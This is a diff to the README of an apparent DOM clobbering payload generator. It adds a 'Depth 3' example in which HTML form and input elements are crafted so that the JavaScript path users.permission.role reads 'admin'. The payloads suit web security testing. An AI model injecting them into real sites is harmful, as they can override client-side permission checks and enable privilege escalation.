@@ -43,9 +43,9 @@ console.log(fm.action);   // http://localhost/login
 List of tags which supports the name attribute:
 - `embed`, `form`, `iframe`, `image`, `img`, `object`
 
-## Usage
+## Tool usage
 
-## Depth 2
+### Depth 2
 
 ```bash
 $ python3 generator.py video.lang 'Hello!'
@@ -72,7 +72,28 @@ chrome_required = True
 <a id="video"></a><a id="video" name="lang" href="a:Hello!"></a>
 ```
 
-## Depth 4
+### Depth 3
+
+```bash
+$ python3 generator.py users.permission.role 'admin'
+********************* INFO **********************
+ALLOWED_ELEMENTS = ['a', 'form', 'input', 'iframe']
+variable_name = 'users.permission.role'
+variable_value = 'admin'
+depth = 3
+document_scope = False
+chrome_required = True
+******************** PAYLOAD #1 ********************
+<form id="users" name="permission" role="admin"></form>
+<form id="users">
+******************** PAYLOAD #2 ********************
+<form id="users" name="permission">
+    <input id="role" value="admin">
+</form>
+<form id="users">
+```
+
+### Depth 4
 
 ```bash
 $ python3 generator.py music.metadata.sound.max '100%'
